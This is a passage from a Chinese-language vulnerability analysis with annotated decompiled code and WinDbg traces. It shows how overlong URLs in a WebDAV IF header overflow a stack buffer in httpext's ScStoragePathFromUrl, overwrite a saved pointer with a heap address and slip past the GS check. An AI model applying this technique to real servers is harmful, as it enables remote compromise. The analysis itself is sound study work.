                goto LABEL_27;
              goto LABEL_30;
            }
            v14 = v17 + 1;
            if ( *v14 == 87 )
              v14 += 2;
            v15 = _wcslen(&String);
            v13 = _wcsncmp(&String, v14, v15);
          }
          else
          {
            v13 = -2147467259;
          }
          if ( v13 )
            goto LABEL_26;
          if ( !v22 )／／如果不等于22，则v26为1 continue，这里v22为0
          {
    LABEL_27:
            v26 = 1;
            v19 = 3;
            continue;
          }
    LABEL_30:
          v26 = 0;
          v19 = 4;
        }
        v2 = 0;
        if ( v26 )／／这里进这里
        {
          v6 = IFITER::PszNextToken(&v20, 1);／／获得下一个url部分，第一次处理完，由于后面还有url，所以这里v6会有值，而第二次，这里后面没有值了
          continue;
        }
        break;
      }
如果看的比较迷糊，可以看我下面的描述，首先这个while函数中，有一个非常有意思的函数PszNextToken，这个函数会连续获取<>中的http
url，直到后面没有http url，则跳出循环，这也是这个漏洞利用的关键条件。
首先，第一次会处理IF后面的第一个http
url，这个url就是http://localhost/aaaa..，这个处理过程，实际上就完成了第一次溢出，首先stackbuffer会通过CStackBuffer函数获取，获取到之后，这个值会存放在stack中的一个位置。接下来会进行第一次ScStorageFromUrl，这个地方会对第一个<>中的http
url处理。长度是0xa7。
    0:009> p
    eax=00fff910 ebx=0060b508 ecx=00000410 edx=00000000 esi=0060c64a edi=77bd8ef2
    eip=671253e2 esp=00fff7bc ebp=00fffc34 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    httpext!HrCheckIfHeader+0xbc:
    671253e2 ffd7            call    edi {msvcrt!wcslen (77bd8ef2)}／／第一次处理aaaa部分，长度只有a7
    0:009> dc 60c64a
    0060c64a  00740068 00700074 002f003a 006c002f  h.t.t.p.:././.l.
    0060c65a  0063006f 006c0061 006f0068 00740073  o.c.a.l.h.o.s.t.
    0060c66a  0061002f 00610061 00610061 00610061  /.a.a.a.a.a.a.a.
    0060c67a  78636f68 71337761 47726936 4b777a39  hocxaw3q6irG9zwK
    0:009> p
    eax=000000a7
这个a7长度很小，不会覆盖到gs，因此可以通过security check，但是这个a7却是一个溢出，它超过了stack
buffer的长度，会覆盖到stack中关于stack buffer指针的存放位置。这个位置保存在ebp-328的位置。
    0:009> p
    eax=00fff800 ebx=0060b508 ecx=0060b508 edx=00000104 esi=00000001 edi=77bd8ef2
    eip=67125479 esp=00fff7b8 ebp=00fffc34 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    httpext!HrCheckIfHeader+0x153:
    67125479 ffb5e4fdffff    push    dword ptr [ebp-21Ch] ss:0023:00fffa18=0060c828
    0:009> p
    eax=00fff800 ebx=0060b508 ecx=0060b508 edx=00000104 esi=00000001 edi=77bd8ef2
    eip=6712547f esp=00fff7b4 ebp=00fffc34 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    httpext!HrCheckIfHeader+0x159:
    6712547f e8cd3fffff      call    httpext!CMethUtil::ScStoragePathFromUrl (67119451)
    0:009> dd ebp-328／／注意拷贝的地址，这个90c是scstoragepathfromurl要拷贝的栈地址
    00fff90c  00fff804 6711205b 00000013 00fff9c0
    00fff91c  671287e7 00000000 000000f0 00000013
可以看到，第一次ScStoragePathFromUrl的时候，拷贝的地址是一个栈地址，通过stackbuffer申请到的，但是由于memcpy引发的栈溢出，导致这个地方值会被覆盖。
    0:009> g//执行结束ScStoragePathFromUrl函数执行返回后
    Breakpoint 0 hit
    eax=00fff800 ebx=0060b508 ecx=00605740 edx=0060c828 esi=00000001 edi=77bd8ef2
    eip=67126c7b esp=00fff79c ebp=00fff7ac iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    httpext!ScStoragePathFromUrl:
    67126c7b b8150d1467      mov     eax,offset httpext!swscanf+0x14b5 (67140d15)
    0:009> g
    Breakpoint 3 hit
    eax=00000000 ebx=0060b508 ecx=00002f06 edx=00fff804 esi=00000001 edi=77bd8ef2
    eip=67125484 esp=00fff7c0 ebp=00fffc34 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    httpext!HrCheckIfHeader+0x15e:
    67125484 8bf0            mov     esi,eax
    0:009> dc fff804／／第一次memcpy之后，覆盖到了90c的位置
    00fff804  003a0063 0069005c 0065006e 00700074  c.:..i.n.e.t.p.
    00fff814  00620075 0077005c 00770077 006f0072  u.b..w.w.w.r.o.
    00fff824  0074006f 0061005c 00610061 00610061  o.t..a.a.a.a.a.
    00fff834  00610061 78636f68 71337761 47726936  a.a.hocxaw3q6irG
    00fff844  4b777a39 75534f70 48687a4f 6d545663  9zwKpOSuOzhHcVTm
    00fff854  39536845 5567506c 33646763 78454630  EhS9lPgUcgd30FEx
    00fff864  54316952 6a514c58 42317241 58507035  Ri1TXLQjAr1B5pPX
    00fff874  6c473664 546a3539 54435034 50617752  d6Gl95jT4PCTRwaP
    0:009> dd fff900
    00fff900  5a306272 54485938 02020202 680312c0
经过这次stack buffer overflow，这个值已经被覆盖，覆盖成了一个堆地址0x680312c0。接下来进入第二次调用。
    0:009> p
    eax=00fff910 ebx=0060b508 ecx=00000410 edx=00000000 esi=0060d32a edi=77bd8ef2
    eip=671253e2 esp=00fff7bc ebp=00fffc34 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    httpext!HrCheckIfHeader+0xbc:
    671253e2 ffd7            call    edi {msvcrt!wcslen (77bd8ef2)}
    0:009> dc 60d32a
    0060d32a  00740068 00700074 002f003a 006c002f  h.t.t.p.:././.l.
    0060d33a  0063006f 006c0061 006f0068 00740073  o.c.a.l.h.o.s.t.
    0060d34a  0062002f 00620062 00620062 00620062  /.b.b.b.b.b.b.b.
    0:009> p
    eax=0000030d
第二次获得http://localhost/bbbbb…的长度，这个长度有0x30d，非常长，但是对应保存的位置变了。
    0:009> p
    eax=00fff800 ebx=0060b508 ecx=00fff800 edx=000002fe esi=00000000 edi=77bd8ef2
    eip=67125436 esp=00fff7c0 ebp=00fffc34 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    httpext!HrCheckIfHeader+0x110:
    67125436 50              push    eax
    0:009> p
    eax=00fff800 ebx=0060b508 ecx=00fff800 edx=000002fe esi=00000000 edi=77bd8ef2
    eip=67125437 esp=00fff7bc ebp=00fffc34 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    httpext!HrCheckIfHeader+0x111:
    67125437 ffb5d8fcffff    push    dword ptr [ebp-328h] ss:0023:00fff90c=680312c0
    0:009> dc ebp-328
    00fff90c  680312c0 52566c44 6c6d4b37 585a4f58  ...hDlVR7KmlXOZX
    00fff91c  496a7950 4a52584f 664d4150 680313c0  PyjIOXRJPAMf...h
    00fff92c  65314834 6e666f43 436c7441 680313c0  4H1eCofnAtlC...h
    00fff93c  6a415343 33307052 424c5866 6346704b  CSAjRp03fXLBKpFc
    0:009> dd 680312c0／／要用到的堆地址，这个地址会在最后用到
    680312c0  00000000 00000000 00000000 00000000
    680312d0  00000000 00000000 00000000 00000000
    680312e0  00000000 00000000 00000000 00000000
可以看到，第二次利用的时候，会把ebp-328这个地方的值推入栈中，这个地方应该是stack